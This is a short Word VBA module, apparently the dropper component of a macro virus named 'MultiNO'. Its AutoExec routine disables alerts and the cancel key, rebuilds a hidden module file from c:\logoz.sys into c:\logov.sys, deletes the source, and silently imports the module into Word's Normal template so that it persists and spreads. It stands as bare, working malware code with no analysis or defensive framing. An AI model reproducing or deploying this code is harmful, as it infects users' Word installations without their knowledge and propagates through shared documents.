Attribute VB_Name = "iMultiNO"
Sub AutoExec()
On Error GoTo E
Application.DisplayAlerts = False
Application.EnableCancelKey = wdDisabled
On Error GoTo make
Open "c:\logov.sys" For Input As #1
Close 1
GoTo imprt
make:
On Error GoTo E
Open "c:\logoz.sys" For Input As #1
Open "c:\logov.sys" For Output As #2
Do
Line Input #1, a$
If Mid$(a$, 5, 1) = ":" Then a$ = "Print #1, " + Chr$(34) + "e" + Mid$(a$, 6, 29) + " " + Mid$(a$, 36, 23) + Chr$(34)
Print #2, a$
Loop Until EOF(1)
Close
Kill "c:\logoz.sys"
imprt:
n = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To n
If NormalTemplate.VBProject.VBComponents(i).Name = "MultiNO" Then GoTo E
Next i
NormalTemplate.VBProject.VBComponents.Import("c:\logov.sys")
NormalTemplate.Save
E:
End Sub
